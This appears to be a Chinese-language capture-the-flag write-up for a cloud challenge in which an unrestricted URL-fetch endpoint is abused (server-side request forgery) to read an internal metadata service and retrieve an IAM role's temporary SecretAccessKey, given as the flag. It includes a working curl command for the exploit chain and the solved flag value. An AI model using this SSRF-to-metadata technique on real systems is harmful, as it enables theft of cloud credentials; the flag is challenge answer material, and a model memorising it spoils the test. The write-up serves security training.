## 题目原文

> 某公司在云主机上对外提供了一个具备远程内容获取功能的 Web 应用。已获授权对其云环境进行安全评估，请设法获取其中受保护的敏感凭据（flag）。

## 题解

### 入口与指纹

首页标题是 `AWS EC2 Proxy Portal`。它列出 `POST /api/fetch`、`GET /api/status`、`GET /api/health`。`/api/status` 把内部元数据地址写成 `http://imds:8080`。

### 关键观察

`/api/fetch` 接受任意 URL，没有限制内网主机名。链路本地地址 `169.254.169.254` 连接超时。同一接口去拉 `http://imds:8080/latest/meta-data/iam/security-credentials/`，正文是角色名 `s3-access-role`。

### 利用链

```bash
T=$(head -1 .target)
curl -sS -H 'Content-Type: application/json' \
  -d '{"url":"http://imds:8080/latest/meta-data/iam/security-credentials/s3-access-role"}' \
  "http://$T/api/fetch"
```

返回的 `SecretAccessKey` 就是 flag。本次是 `flag{bea08804-814f-4ee9-b7e5-55b4dcd26d5b}`。平台接受。

### flag 位置

实例角色 `s3-access-role` 的临时密钥字段 `SecretAccessKey`。它没有再放到对象存储里。
